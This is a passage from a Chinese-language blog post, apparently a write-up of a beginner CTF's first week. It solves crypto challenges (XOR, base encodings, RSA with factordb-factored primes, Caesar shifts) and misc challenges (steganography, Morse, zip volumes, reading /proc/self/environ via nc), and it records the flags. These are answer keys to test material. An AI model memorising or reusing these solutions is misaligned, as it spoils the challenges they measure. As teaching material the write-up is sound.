class="comment"># 18329866411473355926313989435</span></span><br><span class="line">c1_xor = c1 ^ key2</span><br><span class="line">c1_bytes = long_to_bytes(c1_xor)</span><br><span class="line">c1_str = c1_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">c2_xor = c2 ^ key2</span><br><span class="line">c2_bytes = long_to_bytes(c2_xor)</span><br><span class="line">c2_str = c2_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">flag = c1_str + c2_str</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="Base："><a href="#Base：" class="headerlink" title="Base："></a>Base：</h3><p>将<code>4C4A575851324332474E324547554B494A5A4446513653434E564D444154545A4B354D45454D434E4959345536544B474D5134513D3D3D3D</code>扔进cyberchef，经过16进制+base32+base64转换为<font color=deepskyblue><strong>flag{B@sE_0f_CrYpt0_N0W}</strong></font>.</p>
<h3 id="一眼秒了："><a href="#一眼秒了：" class="headerlink" title="一眼秒了："></a>一眼秒了：</h3><p>观察所给py文件发现是RSA加密算法，给了两个308位的整数，测试getprime(512)函数发现生成的是154-155位的质数，这样得到的n可以是308位的整数，将第一个数(n)因数分解（分解网站<code>https://factordb.com/</code>）得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p=7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421</span><br><span class="line">q=7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956045093</span><br></pre></td></tr></table></figure>
<p>计算φ(n) &#x3D; (p-1)*(q-1)： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phin=52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674858130758088899044472900099582762041084679725101595564288259840921657497158600332295551583526683560422708098048258479197276963841017255615653572783474986640</span><br></pre></td></tr></table></figure>
<p>私钥d 使用 gmpy2.invert(e,φ(n))求解得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d=50815830946428726535614046353626937023197652348927437511761939372692971763376865348702551167390521792222849904014468110435221645117001665727526339627128906414128425003411450284449391237239907716037717446619737025290761260576445929041941546093509744402441915711334879221133938020030558707487954892232538055553</span><br></pre></td></tr></table></figure>
<p>结合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span><br></pre></td></tr></table></figure>
<p>而m &#x3D; pow(c, d, n)，得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m=56006392793407635344141327873443751833955250118605130634434259084012318581267186801727168881696715389</span><br></pre></td></tr></table></figure>
<p>把m从long转化为bytes得到b’<font color=deepskyblue><strong>flag{9cd4b35a-affc-422a-9862-58e1cc3ff8d2}</strong></font>‘，即包含flag.<br>Python代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421</span></span><br><span class="line">q = <span class="number">7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956045093</span></span><br><span class="line">phin = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;φ =&#x27;</span>,phin)</span><br><span class="line">d = gmpy2.invert(e,phin)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line">d = <span class="number">50815830946428726535614046353626937023197652348927437511761939372692971763376865348702551167390521792222849904014468110435221645117001665727526339627128906414128425003411450284449391237239907716037717446619737025290761260576445929041941546093509744402441915711334879221133938020030558707487954892232538055553</span></span><br><span class="line">c = <span class="number">48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span></span><br><span class="line">m = powmod(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m =&#x27;</span>,m)</span><br><span class="line">m = <span class="number">56006392793407635344141327873443751833955250118605130634434259084012318581267186801727168881696715389</span></span><br><span class="line">m2 = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m2 =&#x27;</span>,m2)</span><br><span class="line">m3 = m2.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m3 =&#x27;</span>, m3)</span><br></pre></td></tr></table></figure>

<h3 id="Strange-King："><a href="#Strange-King：" class="headerlink" title="Strange King："></a>Strange King：</h3><p>观察发现<font color=red><strong>ksjr{EcxvpdErSvcDgdgEzxqjql}</strong></font>的前四位是偏移量分别为5,7,9,11的凯撒加密，以此类推得到初步结果<font color=red><strong>flag{RngcugFqPqvUvqrNgctkpi}</strong></font>，被包裹部分再进行偏移量为2的凯撒解密得到<font color=deepskyblue><strong>flag{PleaseDoNotStopLearing}</strong></font>.</p>
<h2 id="Misc方向："><a href="#Misc方向：" class="headerlink" title="Misc方向："></a>Misc方向：</h2><h3 id="WhereIsFlag："><a href="#WhereIsFlag：" class="headerlink" title="WhereIsFlag："></a>WhereIsFlag：</h3><p>下载vmware和linux Ubuntu并安装虚拟机，在指令行里面nc指令进入所给地址，经过测试用ls指令在proc&#x2F;self里找到三个文件，其中environ用cat指令查看得到<font color=deepskyblue><strong>flag{a3aacfc0-a14c-4331-9cc1-0f70dc678d4b}</strong></font>.</p>
<h3 id="Labyrinth："><a href="#Labyrinth：" class="headerlink" title="Labyrinth："></a>Labyrinth：</h3><p>查看图片的LSB（<code>lsb.daidr.me</code>），在<code>RGB plane 0</code>模式下得到一张二维码，扫描得到<font color=deepskyblue><strong>flag{e33bb7a1-ac94-4d15-8ff7-fd8c88547b43}</strong></font>.</p>
<h3 id="decompress："><a href="#decompress：" class="headerlink" title="decompress："></a>decompress：</h3><p>将16个zip压缩分卷合并解压得到<font color=deepskyblue><strong>flag{e6468aaf-7ddc-4eb2-b6db-bce9f1ffb52f_oOo0hhh_U_r3411y_K0nw_h0w_2_d3c0mpr355_Multi-part_archive_5e35fcde-28e1-487d-9659-ba2dab629bb3_&amp;_Th1s_f1ag_15_s0O0oO_l0oOoOng999_b433dc9b-db28-4a1d-965b-dc0a95d3a53a}</strong></font>，整体32位小写MD5加密得到<font color=lime><strong>c6edaba55bac51875a215e2de11c35dd</strong></font>，即为flag.</p>
<h3 id="pleasingMusic："><a href="#pleasingMusic：" class="headerlink" title="pleasingMusic："></a>pleasingMusic：</h3><p>将音乐文件中出现的摩斯电码倒置解读得到<font color=red><strong>EZ_MORSE_CODE</strong></font>，即为flag.</p>
<h3 id="兑换码："><a href="#兑换码：" class="headerlink" title="兑换码："></a>兑换码：</h3><p>用winhex修改图片高度，在下方发现<font color=deepskyblue><strong>flag{La_vaguelette}</strong></font>.</p>
<h1 id="Week2施工中…"><a href="#Week2施工中…" class="headerlink" title="Week2施工中…"></a>Week2施工中…</h1>
        
      </div>

         
    </div>
    
     
  </div>
  
    

  
</article>





    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Astral Prisma<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
